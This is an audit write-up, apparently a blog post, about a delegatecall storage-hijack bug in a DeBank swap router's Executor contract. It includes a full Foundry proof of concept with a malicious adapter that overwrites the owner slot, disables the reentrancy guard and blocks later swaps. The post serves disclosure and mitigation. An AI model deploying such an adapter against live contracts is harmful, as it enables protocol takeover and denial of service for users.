---
title: Malicious Adapter Exploit 
date: "2025-11-11"
tags: [security,solidity]
excerpt: A deep dive into delegatecall vulnerabilities, demonstrating how context-sharing enables storage hijacking and protocol-wide denial-of-service.
---



I spent an afternoon poking through the Router / Executor flow of an older contest and the attached adapter model, and what jumped out felt like the kind of bug you’d see almost everywhere , a small design choice (delegatecall into user-registered adapters) that quietly hands the protocol’s own storage to any adapter that ever becomes whitelisted.Though seemingly only a centralisation risk . I also want to state how this may affect the ecosystem.

## Summary

By passing a malicious adapter through Router.swap(), a compromised admin can exploit the delegatecall in Executor to overwrite critical storage—specifically the owner slot. This results in full control over adapter configuration and swap flow, allowing the attacker to blacklist all adapters, freeze swaps, and cause a complete service-level denial-of-service of the protocol.

## Root Cause

The root cause of this vulnerability lies in the insecure use of delegatecall within the Executor contract. The system is designed to route swaps through external adapter contracts using delegatecall in [Executor.sol#L76-L81](https://github.com/sherlock-audit/2025-07-debank/blob/71400519400e462f92f4b7104a73fa1d8f599321/swap-router-v1/src/executor/Executor.sol#L76-L81) , which runs the adapter’s logic within the storage context of the Executor itself.
This approach exposes critical internal storage — such as the owner variable stored at slot 0 (due to inheritance from OpenZeppelin’s Ownable) — to manipulation. If an attacker can deploy a malicious adapter and convince an admin to whitelist it, they can overwrite storage via crafted delegatecall payloads during a normal swap. This results in full ownership takeover, the ability to modify or wipe out the adapter whitelist, and ultimately a denial-of-service attack that halts all protocol swaps. The core issue is the absence of sandboxing or memory isolation between trusted core logic and externally registered adapter code.

## External Pre-conditions

1.An admin needs to call `updateAdaptor()` to set `whiteListAdapter[maliciousAdapter]` to be true(malicious or accidental behaviour)

## Attack Path

1. **Attacker** deploys a **malicious adapter** contract with custom logic to overwrite storage slot `0` (e.g., to set themselves /random address as `Executor.owner`),disable *re-entrancy* status or overwrite *whitelisted* mapping.
2. **Admin** (accidentally or maliciously) calls `Router.updateAdaptor()` to whitelist the attacker's adapter.
→ *This is required because only whitelisted adapters are allowed to be executed.*
3. **Attacker** calls `Router.swap()` and includes their **malicious adapter** in the swap path.
→ *The input uses the adapter in a valid `MultiPath` and `SinglePath` structure.*
4. **Router** forwards the call to `Executor.executeMegaSwap()` with the attacker's adapter included in the path.
5. **Executor** performs a `delegatecall` into the attacker’s adapter at , executing its logic **within Executor's storage context**.
6. **Malicious adapter logic** overwrites storage slot `0`, setting `Executor.owner` to the attacker’s address.
7. **Attacker** now owns the `Executor`, and calls `updateAdaptor()` to remove all valid adapters or add more malicious ones(Though anyways `executeMegaSwap` is broken now being owned by `router` which is not an owner anymore after the attack !! So this step is not necessary).

8. **Swaps begin to fail** as no valid adapter paths remain, effectively causing a **protocol-wide denial-of-service (DoS)**.

## Impact

The protocol suffers a complete halt of all swap operations.
The attacker gains full control over the Executor contract and can block swaps, remove adapters, or add backdoors.
This results in a protocol-wide denial-of-service (DoS) for all users, who can no longer execute swaps.

## PoC

````solidity

/*
Copyright Debank
SPDX-License-Identifier: BUSL-1.1
*/
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../src/router/Router.sol";
import "../src/executor/Executor.sol";
import "../src/adapter/mainnet/Adapter1.sol";

contract MaliciousAdapter is IAdapter {
    function executeSimpleSwap(
        address fromToken,
        address toToken,
        uint256 fromTokenAmount,
        Utils.SimpleSwap[] memory swaps
    ) external payable override {
        address currentContract = address(this);
        assembly {
            sstore(1, 0) // disable reentrancy guard
            sstore(0, 0x123) // set the executor owner to a hardcoded address of attacker's choice !!
            
            // Now use the currentContract variable
            mstore(0x00, currentContract)
            mstore(0x20, 2) // slot 2 for whitelistadapter
            let slot := keccak256(0x00, 0x40)
            sstore(slot, 1) // set to true
            return(0, 0)
        }
    }
    
    receive() external payable {}
    // This function is intentionally left empty to allow the contract to receive Ether.
}

contract POC is Test {
    address admin = makeAddr("admin");
    using SafeERC20 for IERC20;
    Cheats internal constant cheats = Cheats(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    
    Executor public executor;
    Router public router;
    Adapter1 public adapter1;
    address public feeReceiver = 0x5D7c30c04c6976D4951209E55FB158DBF9F8F287;
    address[3] public admins = [
        0xE472e1083bd428dC168413840a4949E372086167,
        admin, 
        0x4049C0A9a11816c79c35dC7206bd48301878A735
    ];

    function setUp() public {
        router = new Router(admins, 1e16);
        adapter1 = new Adapter1(
            0x6B175474E89094C44Da98b954EedeAC495271d0F,
            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2,
            0x000000000022D473030F116dDEE9F6B43aC78BA3
        );
        
        vm.startPrank(admin);
        router.updateAdaptor(address(adapter1), true);
        vm.stopPrank();
    }

    function testExploitDelegatecallStorageHijack() public {
        MaliciousAdapter maliciousAdapter = new MaliciousAdapter();
        
        // add the malicious adapter to the whitelist
        vm.startPrank(admin);
        router.updateAdaptor(address(maliciousAdapter), true);
        vm.stopPrank();
        
        // Construct exploit path a simple weth->Dai swap
        Utils.SimpleSwap[] memory swaps = new Utils.SimpleSwap[](1);
        Utils.Adapter[] memory adapters = new Utils.Adapter[](1);
        adapters[0] = Utils.Adapter(payable(address(maliciousAdapter)), 1e18, swaps);
        
        Utils.SinglePath[] memory singlePaths = new Utils.SinglePath[](1);
        singlePaths[0] = Utils.SinglePath(address(0), adapters);
        
        Utils.MultiPath[] memory multiPaths = new Utils.MultiPath[](1);
        multiPaths[0] = Utils.MultiPath(1e18, singlePaths);
        
        address oldExecutorOwner = router.executor().owner();
        deal(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this), 1 ether);
        IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).approve(address(router), 1 ether);
        
        // Execute exploit swap
        router.swap(
            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2,
            1 ether,
            0x6B175474E89094C44Da98b954EedeAC495271d0F,
            0,
            true,
            0,
            feeReceiver,
            multiPaths
        );
        
        deal(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this), 1 ether);
        IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).approve(address(router), 1 ether);
        
        // now owner of executor is hijacked
        // reentrancyguard status is down (not nonReentrant)
        assert(router.executor().owner() != oldExecutorOwner);
        
        // protocol is halted and a DOS is carried out !!
        vm.expectRevert();
        router.swap(
            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2,
            1 ether,
            0x6B175474E89094C44Da98b954EedeAC495271d0F,
            0,
            true,
            0,
            feeReceiver,
            multiPaths
        );
    }
    
    receive() external payable {}
}

````

### Mitigation

1. Remove `delegatecall`, use `call` instead.


